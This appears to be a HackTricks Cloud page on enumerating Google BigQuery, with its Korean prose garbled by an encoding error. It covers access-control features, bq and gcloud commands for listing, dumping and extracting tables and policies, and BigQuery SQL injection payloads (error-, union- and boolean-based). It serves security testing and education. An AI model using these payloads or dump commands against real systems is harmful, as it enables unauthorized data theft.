# GCP - Bigquery Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ **ì œë¡œ**ë¶€í„° **íˆì–´ë¡œ**ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud**ì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”
* github ì €ì¥ì†Œ.

</details>

## ê¸°ë³¸ ì •ë³´

Google Cloud BigQueryëŠ” **ì™„ì „ ê´€ë¦¬í˜•, ì„œë²„ë¦¬ìŠ¤ ì—”í„°í”„ë¼ì´ì¦ˆ ë°ì´í„° ì›¨ì–´í•˜ìš°ìŠ¤**ë¡œ, **í˜íƒ€ë°”ì´íŠ¸ ë‹¨ìœ„ì˜ ë°ì´í„°**ë¥¼ ë¶„ì„í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ ëŒ€ê·œëª¨ ë°ì´í„°ì…‹ì„ íš¨ìœ¨ì ìœ¼ë¡œ ì²˜ë¦¬í•©ë‹ˆë‹¤. í”Œë«í¼ìœ¼ë¡œì„œì˜ ì„œë¹„ìŠ¤(PaaS)ë¡œ, ìˆ˜ë™ ê°ì‹œê°€ í•„ìš” ì—†ì´ ë°ì´í„° ê´€ë¦¬ë¥¼ ìš©ì´í•˜ê²Œ í•˜ëŠ” ì¸í”„ë¼ì™€ ë„êµ¬ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

**ANSI SQL**ì„ ì‚¬ìš©í•œ ì¿¼ë¦¬ë¥¼ ì§€ì›í•©ë‹ˆë‹¤. ì£¼ìš” ê°ì²´ëŠ” **í…Œì´ë¸”ì„ í¬í•¨í•˜ëŠ” ë°ì´í„°ì…‹**ì…ë‹ˆë‹¤.

### ì•”í˜¸í™”

ê¸°ë³¸ì ìœ¼ë¡œ **Google ê´€ë¦¬í˜• ì•”í˜¸í™” í‚¤**ê°€ ì‚¬ìš©ë˜ì§€ë§Œ **ê³ ê° ê´€ë¦¬í˜• ì•”í˜¸í™” í‚¤ (CMEK)**ë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°ì´í„°ì…‹ ë° ë°ì´í„°ì…‹ ë‚´ í…Œì´ë¸” ë‹¹ ì•”í˜¸í™” í‚¤ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë§Œë£Œ

ë°ì´í„°ì…‹ì— **ë§Œë£Œ ì‹œê°„ì„ ì§€ì •**í•˜ì—¬ í•´ë‹¹ ë°ì´í„°ì…‹ì— ìƒì„±ëœ ìƒˆ í…Œì´ë¸”ì´ ìƒì„± í›„ ì§€ì •ëœ ì¼ ìˆ˜ í›„ì— **ìë™ìœ¼ë¡œ ì‚­ì œ**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì™¸ë¶€ ì†ŒìŠ¤

BigqueryëŠ” ë‹¤ë¥¸ Google ì„œë¹„ìŠ¤ì™€ ê¹Šê²Œ í†µí•©ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë²„í‚·, pub/sub, google drive, RDS ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë°ì´í„°ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë°ì´í„°ì…‹ ACL

ë°ì´í„°ì…‹ì´ ìƒì„±ë˜ë©´ **ACLì´ ì²¨ë¶€**ë˜ì–´ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ ë°ì´í„°ì…‹ì„ ë§Œë“  ì‚¬ìš©ìì—ê²Œ **ì†Œìœ ì** ê¶Œí•œì´ ë¶€ì—¬ë˜ë©°, ê·¸ë£¹ **projectOwners** (í”„ë¡œì íŠ¸ ì†Œìœ ì), **projectWriters** ê·¸ë£¹ì—ëŠ” **ì‘ì„±ì** ê¶Œí•œì´, **projectReaders** ê·¸ë£¹ì—ëŠ” **ë¦¬ë”** ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤.
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### í…Œì´ë¸” í–‰ ì•¡ì„¸ìŠ¤ ì œì–´

í–‰ ì•¡ì„¸ìŠ¤ ì •ì±…ì„ ì‚¬ìš©í•˜ì—¬ **ì£¼ìš” ìš”ì†Œê°€ í…Œì´ë¸” ë‚´ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” í–‰ì„ ì œì–´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì •ì±…ì€ [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create\_row\_access\_policy\_statement)ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸” ë‚´ì—ì„œ ì •ì˜ë©ë‹ˆë‹¤.\
ì•¡ì„¸ìŠ¤ ì •ì±…ì€ í•„í„°ë¥¼ ì •ì˜í•˜ë©° í•´ë‹¹ í•„í„°ì™€ ì¼ì¹˜í•˜ëŠ” í–‰ë§Œì´ ì§€ì •ëœ ì£¼ìš” ìš”ì†Œì— ì˜í•´ **ì•¡ì„¸ìŠ¤ ê°€ëŠ¥**í•©ë‹ˆë‹¤.
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### ì—´ ì•¡ì„¸ìŠ¤ ì œì–´

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

ì—´ ìˆ˜ì¤€ì—ì„œ ë°ì´í„° ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ë ¤ë©´:

1. **ë¶„ë¥˜ ì²´ê³„ ë° ì •ì±… íƒœê·¸ë¥¼ ì •ì˜**í•©ë‹ˆë‹¤. ë°ì´í„°ë¥¼ ìœ„í•œ ë¶„ë¥˜ ì²´ê³„ ë° ì •ì±… íƒœê·¸ë¥¼ ìƒì„±í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤. [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. ì„ íƒ ì‚¬í•­: **ë°ì´í„° ì¹´íƒˆë¡œê·¸ ì„¸ë¶„í™”ëœ ë¦¬ë” ì—­í• ì„ í•˜ë‚˜ ì´ìƒì˜ ì£¼ì²´ì—ê²Œ ë¶€ì—¬**í•©ë‹ˆë‹¤. ìƒì„±í•œ ì •ì±… íƒœê·¸ ì¤‘ í•˜ë‚˜ ì´ìƒì— ëŒ€í•´ í•˜ë‚˜ ì´ìƒì˜ ì£¼ì²´ì—ê²Œ ë°ì´í„° ì¹´íƒˆë¡œê·¸ ì„¸ë¶„í™”ëœ ë¦¬ë” ì—­í• ì„ ë¶€ì—¬í•©ë‹ˆë‹¤.
3. **BigQuery ì—´ì— ì •ì±… íƒœê·¸ í• ë‹¹**í•©ë‹ˆë‹¤. BigQueryì—ì„œ ìŠ¤í‚¤ë§ˆ ì£¼ì„ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ë ¤ëŠ” ê° ì—´ì— ì •ì±… íƒœê·¸ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.
4. **ë¶„ë¥˜ ì²´ê³„ì—ì„œ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ê°•ì œ**í•©ë‹ˆë‹¤. ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ê°•ì œí•˜ë©´ ë¶„ë¥˜ ì²´ê³„ì˜ ëª¨ë“  ì •ì±… íƒœê·¸ì— ëŒ€í•´ ì •ì˜ëœ ì•¡ì„¸ìŠ¤ ì œí•œì´ ì ìš©ë©ë‹ˆë‹¤.
5. **ì •ì±… íƒœê·¸ì—ì„œ ì•¡ì„¸ìŠ¤ ê´€ë¦¬**í•©ë‹ˆë‹¤. [Identity and Access Management](https://cloud.google.com/iam) (IAM) ì •ì±…ì„ ì‚¬ìš©í•˜ì—¬ ê° ì •ì±… íƒœê·¸ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•©ë‹ˆë‹¤. í•´ë‹¹ ì •ì±…ì€ ì •ì±… íƒœê·¸ì— ì†í•˜ëŠ” ê° ì—´ì— ëŒ€í•´ ì ìš©ë©ë‹ˆë‹¤.

ì‚¬ìš©ìê°€ ì¿¼ë¦¬ ì‹œê°„ì— ì—´ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  í•  ë•Œ, BigQueryëŠ” **ì—´ ì •ì±… íƒœê·¸ ë° í•´ë‹¹ ì •ì±…ì„ í™•ì¸í•˜ì—¬ ì‚¬ìš©ìê°€ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸**í•©ë‹ˆë‹¤.

{% hint style="success" %}
ìš”ì•½í•˜ë©´, íŠ¹ì • ì‚¬ìš©ìì—ê²Œ íŠ¹ì • ì—´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œí•˜ë ¤ë©´ **ìŠ¤í‚¤ë§ˆì˜ ì—´ì— íƒœê·¸ë¥¼ ì¶”ê°€í•˜ê³  ì‚¬ìš©ìì˜ ì•¡ì„¸ìŠ¤ë¥¼ ì œí•œ**í•˜ì—¬ í•´ë‹¹ íƒœê·¸ì˜ ë¶„ë¥˜ ì²´ê³„ì—ì„œ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ë¶„ë¥˜ ì²´ê³„ì—ì„œ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ê°•ì œí•˜ë ¤ë©´ ì„œë¹„ìŠ¤ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ì—´ì˜ íƒœê·¸ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
### ì—´ê±°

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Misc
bq show --encryption_service_account # Get encryption service account
```
### BigQuery SQL Injection

ë” ë§ì€ ì •ë³´ë¥¼ ì›í•˜ì‹œë©´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac). ì—¬ê¸°ì„œëŠ” ì¼ë¶€ ì„¸ë¶€ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤.

**ì£¼ì„**:

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` ê·¸ëŸ¬ë‚˜ ì´ˆê¸° ê²ƒë§Œ ì‘ë™í•˜ì§€ ì•ŠìŒ
* `select 1--from here it is not working`

**í™˜ê²½**ì— ëŒ€í•œ **ì •ë³´**ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:

* í˜„ì¬ ì‚¬ìš©ì: `select session_user()`
* í”„ë¡œì íŠ¸ ID: `select @@project_id`

**ë°ì´í„°ì…‹**, **í…Œì´ë¸”** ë° **ì—´** ì´ë¦„ ê°€ì ¸ì˜¤ê¸°:

* **í”„ë¡œì íŠ¸** ë° **ë°ì´í„°ì…‹** ì´ë¦„:

{% code overflow="wrap" %}
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **ì—´** ë° **í…Œì´ë¸”** ì´ë¦„:&#x20;

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM digital-bonfire-410512.importeddataset.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **ë™ì¼í•œ í”„ë¡œì íŠ¸**ì˜ ë‹¤ë¥¸ ë°ì´í„° ì„¸íŠ¸:&#x20;

{% code overflow="wrap" %}
```sql
#Â SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM digital-bonfire-410512.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**SQL Injection types:**

* Error based - casting: `select CAST(@@project_id AS INT64)`
* Error based - division by zero: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* Union based: `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* Boolean based: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* Potential time based - Usage of public datasets example: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**Documentation:**

* All function list: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* Scripting statements: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### Privilege Escalation & Post Exploitation

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### Persistence

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## References

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
* github repos.

</details>
